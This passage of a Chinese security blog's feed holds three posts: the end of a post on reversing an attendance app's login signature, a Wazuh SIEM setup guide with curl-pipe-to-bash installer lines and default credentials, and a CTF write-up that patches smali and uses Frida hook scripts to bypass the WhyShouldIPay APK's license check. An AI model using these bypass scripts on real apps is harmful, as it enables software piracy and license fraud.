alt="image20191228221903626.png"></p><p>如果仔细想想，这个请求中貌似没有变化的量那岂不是只需要做这个请求就可以，干嘛需要加密算法呢。这个请求中没有变化的值，但是登陆中有啊，其中的reqssn就不再是固定值，而是一个当前的时间戳，这时候就需要算法来生成sign。总不能cookie失效一次就抓一次包改一次cookie吧。</p><p>登陆的时候参数就是</p><pre><code>&lt;fm&gt;&lt;pwd&gt;cxxxxxxxx0b33xxxxxxxxxxxxxx&lt;/pwd&gt;&lt;userid&gt;17xxxxxxx&lt;/userid&gt;&lt;ver&gt;3.2.0&lt;/ver&gt;&lt;rmk1/&gt;&lt;rmk2&gt;2&lt;/rmk2&gt;&lt;rmk3&gt;ffxxxxxx-xxxx-xxxx-xxxx-xxxxxxx9b&lt;/rmk3&gt;&lt;action&gt;login&lt;/action&gt;&lt;reqssn&gt;20191225122352145&lt;/reqssn&gt;&lt;/fm&gt;</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;公司打卡APP，由于偶尔忘记打卡，所以想做一个能查询是否打卡来提醒自己的脚本，为什么不做自动打卡脚本，担心万一更新出问题，但没有发现，那岂不是很尴尬。&lt;/p&gt;
&lt;p&gt;首先抓包，查看查询打卡的请求。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://i.loli.net/20
      
    
    </summary>
    
    
      <category term="Android逆向" scheme="/tags/Android%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>OSSEC Wazuh</title>
    <link href="/2019/12/OSSEC-Wazuh/"/>
    <id>/2019/12/OSSEC-Wazuh/</id>
    <published>2019-12-06T05:47:30.000Z</published>
    <updated>2019-12-06T05:47:30.353Z</updated>
    
    <content type="html"><![CDATA[<h2 id="安装Wazuh-manager"><a href="#安装Wazuh-manager" class="headerlink" title="安装Wazuh manager"></a>安装Wazuh manager</h2><p>使用Ubuntu系统，目前wazuh版本为3.10</p><p>安装文档地址：<a href="https://documentation.wazuh.com/3.10/installation-guide/installing-elastic-stack/elastic_server_deb.html" target="_blank" rel="noopener">https://documentation.wazuh.com/3.10/installation-guide/installing-elastic-stack/elastic_server_deb.html</a></p><h3 id="添加更新源"><a href="#添加更新源" class="headerlink" title="添加更新源"></a>添加更新源</h3><pre><code>apt-get updateapt-get install curl apt-transport-https lsb-release#需要python2.7以上curl -s https://packages.wazuh.com/key/GPG-KEY-WAZUH | apt-key add -    #添加更新源echo &quot;deb https://packages.wazuh.com/3.x/apt/ stable main&quot; | tee -a /etc/apt/sources.list.d/wazuh.list          #更新包apt-get update</code></pre><h3 id="安装Wazuh-Manager"><a href="#安装Wazuh-Manager" class="headerlink" title="安装Wazuh Manager"></a>安装Wazuh Manager</h3><pre><code>apt-get install wazuh-managerservice wazuh-manager status         #检查运行状态</code></pre><p><img src="https://i.loli.net/2019/12/06/Ru2XzHUAwe4oa9m.png" alt="1573632035628.png"></p><h3 id="安装Wazuh-API"><a href="#安装Wazuh-API" class="headerlink" title="安装Wazuh API"></a>安装Wazuh API</h3><pre><code>如果不能直接安装nodejs需要添加更新源安装curl -sL https://deb.nodesource.com/setup_8.x | bash - apt-get install nodejsapt-get install wazuh-apiservice wazuh-api status                #检查运行状态sed -i &quot;s/^deb/#deb/&quot; /etc/apt/sources.list.d/wazuh.list     #禁用Wazuh更新源apt-get update</code></pre><p><img src="https://i.loli.net/2019/12/06/7PYhXvpbqlon3WA.png" alt="1573632016475.png"><br>配置API用户信息，启用HTTPS，可以使用脚本生成证书或者自动生成证书，以下自动生成证书，同时还可以修改访问API的用户，默认用户密码是foo和bar。如需要修改记得重启服务。</p><pre><code># 配置端口账户等信息cd /var/ossec/api/scripts./configure_api.sh#不使用脚本修改cd /var/ossec/api/configuration/authnode htpasswd -Bc -C 10 user myUserName</code></pre><p><img src="https://i.loli.net/2019/12/06/P84TgHbWezd6Bo5.png" alt="1573632486393.png"></p><h2 id="安装Filebeat"><a href="#安装Filebeat" class="headerlink" title="安装Filebeat"></a>安装Filebeat</h2><p>Filebeat是Wazuh服务器上的工具，可以将警报和归档事件安全地转发到Elastic Stack服务器上的Logstash服务。</p><p>添加源存储库和密钥：</p><pre><code>apt-get install curl apt-transport-httpscurl -s https://artifacts.elastic.co/GPG-KEY-elasticsearch | apt-key add -echo &quot;deb https://artifacts.elastic.co/packages/7.x/apt stable main&quot; | tee /etc/apt/sources.list.d/elastic-7.x.listapt-get update</code></pre><p>安装</p><pre><code>apt-get install filebeat=7.4.2</code></pre><p>从Wazuh存储库下载Filebeat配置文件。这是预先配置的，用于将Wazuh警报转发到Elasticsearch：</p><pre><code>curl -so /etc/filebeat/filebeat.yml https://raw.githubusercontent.com/wazuh/wazuh/v3.10.2/extensions/filebeat/7.x/filebeat.yml</code></pre><p>下载Elasticsearch的警报模板：</p><pre><code>curl -so /etc/filebeat/wazuh-template.json https://raw.githubusercontent.com/wazuh/wazuh/v3.10.2/extensions/elasticsearch/7.x/wazuh-template.json</code></pre><p>下载适用于Filebeat的Wazuh模块：</p><pre><code>curl -s https://packages.wazuh.com/3.x/filebeat/wazuh-filebeat-0.1.tar.gz | sudo tar -xvz -C /usr/share/filebeat/module</code></pre><p>编辑文件，<code>/etc/filebeat/filebeat.yml</code>并用<code>YOUR_ELASTIC_SERVER_IP</code>Elasticsearch服务器的IP地址或主机名替换。例如：</p><pre><code>output.elasticsearch:  hosts: [&quot;192.168.120.128:9200&quot;]</code></pre><p>启用并启动Filebeat服务：</p><pre><code>systemctl daemon-reloadsystemctl enable filebeat.servicesystemctl start filebeat.service</code></pre><h2 id="安装Elastic-Stack"><a href="#安装Elastic-Stack" class="headerlink" title="安装Elastic Stack"></a>安装Elastic Stack</h2><p>添加弹性存储库及其GPG密钥：</p><pre><code>apt-get install curl apt-transport-httpscurl -s https://artifacts.elastic.co/GPG-KEY-elasticsearch | apt-key add -echo &quot;deb https://artifacts.elastic.co/packages/7.x/apt stable main&quot; | tee /etc/apt/sources.list.d/elastic-7.x.listapt-get update</code></pre><p>安装Elasticsearch软件包：</p><pre><code>apt-get install elasticsearch=7.4.2</code></pre><p>需要Java环境，例如安装openjdk</p><pre><code>apt install openjdk-11-jre-headless</code></pre><p>此处网速影响，挂VPS下载软件包解压使用。</p><p>如果使用源安装编辑文件<code>/etc/elasticsearch/elasticsearch.yml</code>并取消注释设置，将Elasticsearch配置为侦听非回送地址<code>network.host</code>。将值更改为要绑定到的IP：</p><pre><code>network.host: &lt;elasticsearch_ip&gt;</code></pre><p>更改<code>network.host</code>选项后，需要进一步配置。在文件中添加或编辑（如果有注释）以下几行<code>/etc/elasticsearch/elasticsearch.yml</code>：</p><pre><code>node.name: &lt;node_name&gt;cluster.initial_master_nodes: [&quot;&lt;node_name&gt;&quot;]</code></pre><p>如果使用下载文件包启动方式，编辑文件<code>elasticsearch/config/elasticsearch.yml</code>来执行如上操作。</p><p>修改完成后启动ES。</p><pre><code>systemctl daemon-reloadsystemctl enable elasticsearch.servicesystemctl start elasticsearch.service文件启动的话，需要非root用户启动</code></pre><p>检查启动是否正常</p><pre><code>curl http://192.168.120.128:9200</code></pre><p><img src="https://i.loli.net/2019/12/06/9NxKEQgILsohtJ8.png" alt="1575446874341.png"></p><h2 id="安装Kibana"><a href="#安装Kibana" class="headerlink" title="安装Kibana"></a>安装Kibana</h2><p>源安装</p><pre><code>apt-get install kibana=7.4.2</code></pre><p>安装适用于Kibana的Wazuh应用程序插件：</p><p>从URL安装：</p><pre><code>sudo -u kibana /usr/share/kibana/bin/kibana-plugin install https://packages.wazuh.com/wazuhapp/wazuhapp-3.10.2_7.4.2.zip</code></pre><p>从软件包安装：</p><pre><code>sudo -u kibana /usr/share/kibana/bin/kibana-plugin install file:///path/wazuhapp-3.10.2_7.4.2.zip</code></pre><p>编辑文件<code>/etc/kibana/kibana.yml</code>，修改设置<code>server.host</code></p><pre><code>server.host: &quot;192.168.120.128&quot;   //修改为主机地址elasticsearch.hosts: [&quot;http://192.168.120.128:9200&quot;]  //修改为es的主机地址，此处使用同一台主机</code></pre><p>启用并启动Kibana服务：</p><pre><code>systemctl daemon-reloadsystemctl enable kibana.servicesystemctl start kibana.service</code></pre><p>禁用Elasticsearch更新：</p><pre><code>sed -i &quot;s/^deb/#deb/&quot; /etc/apt/sources.list.d/elastic-7.x.listapt-get update</code></pre><p>如果出现Kibana server is not ready yet问题，可能是kibana和es的版本不一致，尝试修改为同一版本，或者是elasticsearch.hosts没有修改为主机的IP，尝试修改为主机IP，再或者是还没刷新成功，等待一会。</p><p>选择小狐狸头像，配置API认证，如果修改了则填入设置的账号密码。</p><p><img src="https://i.loli.net/2019/12/06/D2XBz9NIAEUsjn3.png" alt="1575450038054.png"><br>下载模版文件</p><pre><code># 下载filebeat配置文件curl -so /etc/filebeat/filebeat.yml https://raw.githubusercontent.com/wazuh/wazuh/v3.9.2/extensions/filebeat/7.x/filebeat.ymlchmod go+r /etc/filebeat/filebeat.yml# 下载elasticsearch的模版文件curl -so /etc/filebeat/wazuh-template.json https://raw.githubusercontent.com/wazuh/wazuh/v3.9.2/extensions/elasticsearch/7.x/wazuh-template.jsonchmod go+r /etc/filebeat/wazuh-template.json</code></pre><p>配置Filebeat</p><pre><code>output.elasticsearch:  hosts: [&#39;http://YOUR_ELASTIC_SERVER_IP:9200&#39;]# 修改为output.elasticsearch:  hosts: [&#39;http://192.168.120.128:9200&#39;]</code></pre><h2 id="安装Wazuh-agent"><a href="#安装Wazuh-agent" class="headerlink" title="安装Wazuh agent"></a>安装Wazuh agent</h2><p>以上安装可以在一台服务器中，此处agent则需要在需要监控的主机上安装，把agent安装到kali机中。</p><p>添加存储库</p><pre><code>apt-get install curl apt-transport-https lsb-release gnupg2</code></pre><p>安装Wazuh存储库GPG密钥：</p><pre><code>curl -s https://packages.wazuh.com/key/GPG-KEY-WAZUH | apt-key add -</code></pre><p>添加存储库：</p><pre><code>echo &quot;deb https://packages.wazuh.com/3.x/apt/ stable main&quot; | tee /etc/apt/sources.list.d/wazuh.list</code></pre><p>更新软件包</p><pre><code>apt-get update</code></pre><p>使用如下安装还需要配置注册，可以手动注册或者脚本注册</p><pre><code>apt-get install wazuh-agent</code></pre><p><a href="https://github.com/wazuh/wazuh-api/blob/master/examples/api-register-agent.sh" target="_blank" rel="noopener">https://github.com/wazuh/wazuh-api/blob/master/examples/api-register-agent.sh</a></p><p>使用如下安装和部署，需要携带定义的变量，变量说明列表</p><p><a href="https://documentation.wazuh.com/3.10/user-manual/registering/index.html#register-agents" target="_blank" rel="noopener">https://documentation.wazuh.com/3.10/user-manual/registering/index.html#register-agents</a></p><pre><code>WAZUH_MANAGER=&quot;192.168.120.128&quot; apt-get install wazuh-agent   //wazuh-api地址,多个服务使用逗号分隔</code></pre><p>或者下载软件包安装，使用脚本注册</p><p><a href="https://packages.wazuh.com/3.x/apt/pool/main/w/wazuh-agent/wazuh-agent_3.10.2-1_amd64.deb" target="_blank" rel="noopener">https://packages.wazuh.com/3.x/apt/pool/main/w/wazuh-agent/wazuh-agent_3.10.2-1_amd64.deb</a></p><pre><code>#!/bin/bash####  Shell script for registering agents automatically with the API#  Copyright (C) 2017 Wazuh, Inc. All rights reserved.#  Wazuh.com##  This program is a free software; you can redistribute it#  and/or modify it under the terms of the GNU General Public#  License (version 2) as published by the FSF - Free Software#  Foundation.#### Connection variablesAPI_IP=&quot;192.168.120.128&quot;    #wazuh-api 地址API_PORT=&quot;55000&quot;PROTOCOL=&quot;http&quot;USER=&quot;qweasd&quot;PASSWORD=&quot;qweasd&quot;display_help() {cat &lt;&lt;HELP_USAGE    $0  [-h] [-f|--force] [-q|--quiet] [agent]   -h             Show this message.   -f|--force     Force agent removal (if already registered)                  The agent will be re-regitered with a new ID   -s|--silent    Surpress the output while removing the agent   agent          Agent name (if missing we will use the output                  of the hostname command) HELP_USAGE}register_agent() {  # Adding agent and getting Id from manager  echo &quot;&quot;  echo &quot;Adding agent:&quot;  echo &quot;curl -s -u $USER:**** -k -X POST -d &#39;name=$AGENT_NAME&#39; $PROTOCOL://$API_IP:$API_PORT/agents&quot;  API_RESULT=$(curl -s -u $USER:&quot;$PASSWORD&quot; -k -X POST -d &#39;name=&#39;$AGENT_NAME $PROTOCOL://$API_IP:$API_PORT/agents)  echo -e $API_RESULT | grep -q &quot;\&quot;error\&quot;:0&quot; 2&gt;&amp;1  if [ &quot;$?&quot; != &quot;0&quot; ]; then    echo -e $API_RESULT | sed -rn &#39;s/.*&quot;message&quot;:&quot;(.+)&quot;.*/\1/p&#39;    exit 1  fi  # Get agent id and agent key   AGENT_ID=$(echo $API_RESULT | cut -d&#39;:&#39; -f 4 | cut -d &#39;,&#39; -f 1)  AGENT_KEY=$(echo $API_RESULT | cut -d&#39;:&#39; -f 5 | cut -d &#39;}&#39; -f 1)  echo &quot;Agent &#39;$AGENT_NAME&#39; with ID &#39;$AGENT_ID&#39; added.&quot;  echo &quot;Key for agent &#39;$AGENT_ID&#39; received.&quot;  # Importing key  echo &quot;&quot;  echo &quot;Importing authentication key:&quot;  echo &quot;y&quot; | /var/ossec/bin/manage_agents -i $AGENT_KEY  # Restarting agent  echo &quot;&quot;  echo &quot;Restarting:&quot;  echo &quot;&quot;  /var/ossec/bin/ossec-control restart  exit 0}remove_agent() {  echo &quot;Found: $AGENT_ID&quot;  echo &quot;Removing previous registration for &#39;$AGENT_NAME&#39; using ID: $AGENT_ID ...&quot;  # curl -u foo:bar -k -X DELETE &quot;https://127.0.0.1:55000/agents/001  REMOVE_AGENT=$(curl -s -u $USER:&quot;$PASSWORD&quot; -k -X DELETE $PROTOCOL://$API_IP:$API_PORT/agents/$AGENT_ID)  echo -e $REMOVE_AGENT}get_agent_id() {  echo &quot;&quot;  echo &quot;Checking for Agent ID...&quot;  AGENT_ID=$(curl -s -u $USER:&quot;$PASSWORD&quot; -k -X GET $PROTOCOL://$API_IP:$API_PORT/agents/name/$AGENT_NAME | rev | cut -d: -f1 | rev | grep -o &#39;&quot;.*&quot;&#39; | tr -d &#39;&quot;&#39;)}# MAIN# ENTRY POINTwhile getopts &#39;:hfs&#39; OPTION; do  case &quot;$OPTION&quot; in    h)      display_help      exit 0      ;;    f|--force)      FORCE=true      ;;    s|--silent)      SILENT=true      ;;  esacdone# reset $1, $2 .... as normal argument after the flagshift $(($OPTIND - 1))# if no arguments are passed in after the flags, we assign the hostname value to the AGENT_NAME AGENT_NAME=${1:-$(hostname)}get_agent_id# check the return value. If we get an integer back then the agent is already registered. Anything else -&gt; agent is not registered  if ! [ &quot;$AGENT_ID&quot; -eq &quot;$AGENT_ID&quot; ] 2&gt; /dev/null ; then   echo &quot;Starting registration process ...&quot;   :  elif [[ &quot;$FORCE&quot; = true &amp;&amp; &quot;$SILENT&quot; = &quot;true&quot; ]] ; then   remove_agent &gt; /dev/null 2&gt;&amp;1  else    if [[ &quot;$FORCE&quot; = true ]] ; then      remove_agent    fi  fi# Default action -&gt; try to register the agentregister_agent</code></pre><p>配置好后，访问wazuh界面中的agent就可以看到连接状态了</p><p><img src="https://i.loli.net/2019/12/06/2qjpKxCSPB9aem6.png" alt="1575510859374.png"></p><p>在Inventory data中可以看到主机的网卡，网络连接，软件包等信息。</p><p><img src="https://i.loli.net/2019/12/06/lwyWe3P8dVpBxUc.png" alt="1575511010986.png"></p><p>配置文件 <code>/var/ossec/etc/ossec.conf</code>文件完成性监控，同时需要修改server端的获取时间和配置</p><pre><code>&lt;frequency&gt;43200&lt;/frequency&gt;   #默认为十二小时，此处修改为100秒&lt;!-- File integrity monitoring --&gt;&lt;syscheck&gt;    &lt;disabled&gt;no&lt;/disabled&gt;   #文件完整性监控，默认为no&lt;syscheck&gt;  &lt;directories check_all=&quot;yes&quot; realtime=&quot;yes&quot;&gt;/tmp&lt;/directories&gt; #实时扫描，仅使用目录&lt;/syscheck&gt;&lt;syscheck&gt;  &lt;frequency&gt;36000&lt;/frequency&gt;              #计划扫描，每十小时一次  &lt;directories&gt;/etc,/usr/bin,/usr/sbin&lt;/directories&gt;   #计划扫描的目录  &lt;directories&gt;/bin,/sbin&lt;/directories&gt;&lt;/syscheck&gt;&lt;syscheck&gt;                 #包含了实时扫描，同时带有who-data信息  &lt;directories check_all=&quot;yes&quot; whodata=&quot;yes&quot;&gt;/etc&lt;/directories&gt;&lt;/syscheck&gt;&lt;rule id=&quot;100345&quot; level=&quot;12&quot;&gt;   #基于规则检测报警，规则id来自Management/Ruleset  &lt;if_group&gt;syscheck&lt;/if_group&gt;  &lt;match&gt;/var/www/htdocs&lt;/match&gt;  &lt;description&gt;Changes to /var/www/htdocs - Critical file!&lt;/description&gt;&lt;/rule&gt;&lt;directories check_all=&quot;yes&quot;&gt;/etc,/usr/bin,/usr/sbin&lt;/directories&gt;  #要检查的目录（执行所有可能的验证）&lt;ignore&gt;/etc/mtab&lt;/ignore&gt;   #要忽略的目录</code></pre><p>如果启用了whodata字段，需要执行以下安装</p><pre><code>apt install auditdauditctl -l | grep wazuh_fim  #检查是否应用了用于监视所选文件夹的审核规则：-w /etc -p wa -k wazuh_fim</code></pre><p>命令监控，必须将代理显式配置为接受远程命令，文件<code>/var/ossec/etc/local_internal_options.conf</code></p><pre><code>logcollector.remote_commands=1</code></pre><p>根据文档建议，修改<code>/var/ossec/etc/shared/agent.conf</code>文件，如果包含多个组文件夹，需要到每个组文件夹下修改配置文件，name，os，profile是可以设置。</p><pre><code>&lt;agent_config name=&quot;agent_name&quot;&gt;    &lt;localfile&gt;        &lt;location&gt;/var/log/my.log&lt;/location&gt;        &lt;log_format&gt;syslog&lt;/log_format&gt;    &lt;/localfile&gt;&lt;/agent_config&gt;&lt;agent_config os=&quot;Linux&quot;&gt;    &lt;localfile&gt;        &lt;location&gt;/var/log/linux.log&lt;/location&gt;        &lt;log_format&gt;syslog&lt;/log_format&gt;    &lt;/localfile&gt;&lt;/agent_config&gt;&lt;agent_config profile=&quot;database&quot;&gt;    &lt;localfile&gt;        &lt;location&gt;/var/log/database.log&lt;/location&gt;        &lt;log_format&gt;syslog&lt;/log_format&gt;    &lt;/localfile&gt;&lt;/agent_config&gt;&lt;agent_config name=&quot;kali&quot;&gt;    &lt;localfile&gt;        &lt;log_format&gt;command&lt;/log_format&gt;   #command 指逐行读取        &lt;command&gt;df -P&lt;/command&gt;    &lt;/localfile&gt;    &lt;localfile&gt;        &lt;log_format&gt;full_command&lt;/log_format&gt;  #全部匹配查找        &lt;command&gt;netstat -tan |grep LISTEN |egrep -v &#39;(127.0.0.1| ::1)&#39; | sort&lt;/command&gt;      &lt;/localfile&gt;&lt;/agent_config&gt;</code></pre><p>漏洞检测，需要配置agent端和server端<code>/var/ossec/etc/ossec.conf</code></p><pre><code>agent端&lt;wodle name=&quot;syscollector&quot;&gt;  &lt;disabled&gt;no&lt;/disabled&gt;  &lt;interval&gt;1h&lt;/interval&gt;  &lt;packages&gt;yes&lt;/packages&gt;&lt;/wodle&gt;server端&lt;wodle name=&quot;vulnerability-detector&quot;&gt;  &lt;disabled&gt;no&lt;/disabled&gt;  &lt;interval&gt;5m&lt;/interval&gt;  &lt;run_on_start&gt;yes&lt;/run_on_start&gt;  &lt;feed name=&quot;ubuntu-18&quot;&gt;    &lt;disabled&gt;no&lt;/disabled&gt;    &lt;update_interval&gt;1h&lt;/update_interval&gt;  &lt;/feed&gt;&lt;/wodle&gt;systemctl restart wazuh-manager  #重启</code></pre><h2 id="虚拟机"><a href="#虚拟机" class="headerlink" title="虚拟机"></a>虚拟机</h2><p>当然，如果觉得以上安装过于繁琐，可以选择虚拟机安装一个wazuh服务端，仅在64位系统中运行。不建议在生产中直接使用。</p><p><a href="https://packages.wazuh.com/vm/wazuh3.10.2_7.3.2.ova" target="_blank" rel="noopener">https://packages.wazuh.com/vm/wazuh3.10.2_7.3.2.ova</a></p><p>root密码为wazh，api密码为默认的foo/bar。</p><p>安装的Elasticsearch <code>/usr/share/elasticsearch</code>。Filebeat安装在中<code>/usr/share/filebeat</code>，其配置文件位于中<code>/etc/filebeat/filebeat.yml</code>。</p><p>启动服务和重启相关服务</p><pre><code>systemctl restart wazuh-managersystemctl restart wazuh-apisystemctl stop elasticsearchsystemctl start filebeatsystemctl status kibana</code></pre><p>kibana地址为<code>https://IP</code>，在如下界面中即可看到wazuh做的相关配置检查，和建议。此建议开启tcp_syncookies来处理DOS攻击中的SYN握手的资源消耗。</p><p><img src="https://i.loli.net/2019/12/06/iamlXNn75Rphu4O.png" alt="1575601193495.png"></p><p>根据配置文件查看对应配置是否开启，配置默认关闭，根据需求来判断是否开启。</p><p><img src="https://i.loli.net/2019/12/06/V5zTmuawxUJ1jbQ.png" alt="1575601358753.png"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;安装Wazuh-manager&quot;&gt;&lt;a href=&quot;#安装Wazuh-manager&quot; class=&quot;headerlink&quot; title=&quot;安装Wazuh manager&quot;&gt;&lt;/a&gt;安装Wazuh manager&lt;/h2&gt;&lt;p&gt;使用Ubuntu系统，目前wazuh
      
    
    </summary>
    
    
      <category term="Open Source Security" scheme="/tags/Open-Source-Security/"/>
    
  </entry>
  
  <entry>
    <title>Hook WhyShouldIPay</title>
    <link href="/2019/11/Hook-WhyShouldIPay/"/>
    <id>/2019/11/Hook-WhyShouldIPay/</id>
    <published>2019-11-25T09:22:39.000Z</published>
    <updated>2019-11-25T09:24:43.449Z</updated>
    
    <content type="html"><![CDATA[<p>学习Frida的时候看到小肩膀视频中提到了一个apk，whyshouldipay。这个apk之前做过逆向分析修改，所以正好此处使用Frida来尝试HOOK。</p><h3 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h3><p>把apk丢到jeb中，从mainfast文件。可以看到首页activity是LauncherActivity。找到首页activity，点击反编译。</p><p><img src="https://i.loli.net/2019/11/25/IAZ45F2iCPJzoWj.png" alt="1574664538019.png"></p><p>从代码中可以看到，其实是做了一次网络验证，但由于时间久远，这个apk貌似是16年的CTF使用，网址现在已经不能使用了。所以需要这里进行修改，利用AK来修改smail代码。重打包安装。</p><pre><code>.method public verifyClick(Landroid/view/View;)V    .locals 15    .line 39    .restart local v1    # &quot;b&quot;:[B    .restart local v2    # &quot;con&quot;:Ljava/net/URLConnection;    .restart local v5    # &quot;in&quot;:Ljava/io/InputStream;    .restart local v9    # &quot;responseBuilder&quot;:Ljava/lang/StringBuilder;    .restart local v11    # &quot;url&quot;:Ljava/net/URL;    :cond_0    const-string v8, &quot;LICENSEKEYOK&quot;    .line 40    #.local v8, &quot;response&quot;:Ljava/lang/String;    const-string v12, &quot;LICENSEKEYOK&quot;    invoke-virtual {v8, v12}, Ljava/lang/String;-&gt;equals(Ljava/lang/Object;)Z    move-result v12    if-eqz v12, :cond_1    .line 43    new-instance v0, Ljava/lang/String;    invoke-direct {p0}, Lde/fraunhofer/sit/premiumapp/LauncherActivity;-&gt;getMac()Ljava/lang/String;    move-result-object v12    invoke-virtual {v12}, Ljava/lang/String;-&gt;getBytes()[B    move-result-object v12    invoke-virtual {v8}, Ljava/lang/String;-&gt;getBytes()[B    move-result-object v13    invoke-static {v12, v13}, Lde/fraunhofer/sit/premiumapp/MainActivity;-&gt;xor([B[B)[B    move-result-object v12    invoke-direct {v0, v12}, Ljava/lang/String;-&gt;&lt;init&gt;([B)V    .line 44    .local v0, &quot;activatedKey&quot;:Ljava/lang/String;    invoke-virtual {p0}, Lde/fraunhofer/sit/premiumapp/LauncherActivity;-&gt;getApplicationContext()Landroid/content/Context;    move-result-object v12    const-string v13, &quot;preferences&quot;    const/4 v14, 0x0    invoke-virtual {v12, v13, v14}, Landroid/content/Context;-&gt;getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;    move-result-object v7    .line 45    .local v7, &quot;pref&quot;:Landroid/content/SharedPreferences;    invoke-interface {v7}, Landroid/content/SharedPreferences;-&gt;edit()Landroid/content/SharedPreferences$Editor;    move-result-object v4    .line 46    .local v4, &quot;editor&quot;:Landroid/content/SharedPreferences$Editor;    const-string v12, &quot;KEY&quot;    invoke-interface {v4, v12, v0}, Landroid/content/SharedPreferences$Editor;-&gt;putString(Ljava/lang/String;Ljava/lang/String;)Landroid/content/SharedPreferences$Editor;    .line 47    invoke-interface {v4}, Landroid/content/SharedPreferences$Editor;-&gt;commit()Z    .line 48    new-instance v12, Landroid/support/v7/app/AlertDialog$Builder;    invoke-direct {v12, p0}, Landroid/support/v7/app/AlertDialog$Builder;-&gt;&lt;init&gt;(Landroid/content/Context;)V    const-string v13, &quot;Activation successful&quot;    .line 49    invoke-virtual {v12, v13}, Landroid/support/v7/app/AlertDialog$Builder;-&gt;setTitle(Ljava/lang/CharSequence;)Landroid/support/v7/app/AlertDialog$Builder;    move-result-object v12    const-string v13, &quot;Activation successful&quot;    .line 50    invoke-virtual {v12, v13}, Landroid/support/v7/app/AlertDialog$Builder;-&gt;setMessage(Ljava/lang/CharSequence;)Landroid/support/v7/app/AlertDialog$Builder;    move-result-object v12    const v13, 0x1080027    .line 51    invoke-virtual {v12, v13}, Landroid/support/v7/app/AlertDialog$Builder;-&gt;setIcon(I)Landroid/support/v7/app/AlertDialog$Builder;    move-result-object v12    .line 52    invoke-virtual {v12}, Landroid/support/v7/app/AlertDialog$Builder;-&gt;show()Landroid/support/v7/app/AlertDialog;    :cond_1    return-void.end method</code></pre><p>修改如上，重新给v8寄存器赋值。并且删除以上全部请求代码，清楚其他try的代码，不然其做HTTP请求验证。完整的verifyClick函数smail代码如上。至此网络验证的给去掉了。</p><p>点击verify，就会显示验证成功，然后写入本地数据保存key值。</p><p><img src="https://i.loli.net/2019/11/25/FqNsiJSWmjBV6ed.png" alt="1574671361120.png"></p><p>只不过这样修改，再点击premium的时候就是认证成功的了。</p><p><img src="https://i.loli.net/2019/11/25/6HZStIBWULOrNil.png" alt="1574671432194.png"></p><h3 id="Hook-函数"><a href="#Hook-函数" class="headerlink" title="Hook 函数"></a>Hook 函数</h3><p>那么先hook一下getMac和getKey函数，看一下返回是什么值。</p><pre><code>import frida, sysjscode = &quot;&quot;&quot;Java.perform(function(){    var lunc = Java.use(&#39;de.fraunhofer.sit.premiumapp.LauncherActivity&#39;);    lunc.getMac.implementation = function(){        send(&quot;HOOK Start....&quot;);        var sed = this.getMac();        send(sed);        var ser = this.getKey();        send(ser);        return sed;        }})&quot;&quot;&quot;def message(message, data):    if message[&quot;type&quot;] == &quot;send&quot;:        print(&quot;[*] {0}&quot;.format(message[&#39;payload&#39;]))    else:        print(message)process = frida.get_remote_device().attach(&#39;de.fraunhofer.sit.premiumapp&#39;)script = process.create_script(jscode)script.on(&quot;message&quot;, message)script.load()sys.stdin.read()</code></pre><p>在手机上打开Frida。转发端口27042。运行后获取到两个参数，一个是WiFi的Mac，一个是key。</p><p><img src="https://i.loli.net/2019/11/25/32dClO61LBqKiU5.png" alt="1574671869395.png"></p><p>然后按照修改返回参数来直接达到不修改apk的目的。</p><h3 id="Hook-直接获得结果"><a href="#Hook-直接获得结果" class="headerlink" title="Hook 直接获得结果"></a>Hook 直接获得结果</h3><p>从代码中就可以看到，当返回结果为LICENSEKEYOK时，调用MainActivity类下的xor方法。参数一个是上面的Mac的byte值，一个是LICENSEKEYOK的byte值。</p><pre><code>import frida, sysjscode = &quot;&quot;&quot;Java.perform(function(){        //字符串转byte        function stringToBytes(str) {              var ch, st, re = [];             for (var i = 0; i &lt; str.length; i++ ) {                 ch = str.charCodeAt(i);  // get char                  st = [];                 // set up &quot;stack&quot;                  do {                      st.push( ch &amp; 0xFF );  // push byte to stack                      ch = ch &gt;&gt; 8;          // shift value down by 1 byte                  }                    while ( ch );                  re = re.concat( st.reverse() );             }              return re;          }         //byte转字符串        function byteToString(arr) {            if(typeof arr === &#39;string&#39;) {                return arr;            }            var str = &#39;&#39;,                _arr = arr;            for(var i = 0; i &lt; _arr.length; i++) {                var one = _arr[i].toString(2),                    v = one.match(/^1+?(?=0)/);                if(v &amp;&amp; one.length == 8) {                    var bytesLength = v[0].length;                    var store = _arr[i].toString(2).slice(7 - bytesLength);                    for(var st = 1; st &lt; bytesLength; st++) {                        store += _arr[st + i].toString(2).slice(2);                    }                    str += String.fromCharCode(parseInt(store, 2));                    i += bytesLength - 1;                } else {                    str += String.fromCharCode(_arr[i]);                }            }            return str;        }    var lunc = Java.use(&#39;de.fraunhofer.sit.premiumapp.LauncherActivity&#39;);    var main = Java.use(&#39;de.fraunhofer.sit.premiumapp.MainActivity&#39;);    lunc.getKey.implementation = function(){        send(&quot;HOOK Start....&quot;);        var sed = this.getMac();        send(sed);                   //获取mac        var xor = main.xor(stringToBytes(sed), stringToBytes(&quot;LICENSEKEYOK&quot;));   //生成key        var ser = byteToString(xor);        send(ser);        return ser;        }})&quot;&quot;&quot;def message(message, data):    if message[&quot;type&quot;] == &quot;send&quot;:        print(&quot;[*] {0}&quot;.format(message[&#39;payload&#39;]))    else:        print(message)process = frida.get_remote_device().attach(&#39;de.fraunhofer.sit.premiumapp&#39;)script = process.create_script(jscode)script.on(&quot;message&quot;, message)script.load()sys.stdin.read()</code></pre><p>执行如上代码，即可Hook到key函数，然后由xor生成，来返回给getKey函数。返回如下所示。</p><p><img src="https://i.loli.net/2019/11/25/D1Z8BlvRaft6rAh.png" alt="1574673463247.png"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;学习Frida的时候看到小肩膀视频中提到了一个apk，whyshouldipay。这个apk之前做过逆向分析修改，所以正好此处使用Frida来尝试HOOK。&lt;/p&gt;
&lt;h3 id=&quot;逆向分析&quot;&gt;&lt;a href=&quot;#逆向分析&quot; class=&quot;headerlink&quot; title
      
    
    </summary>
    
    
      <category term="Android逆向" scheme="/tags/Android%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
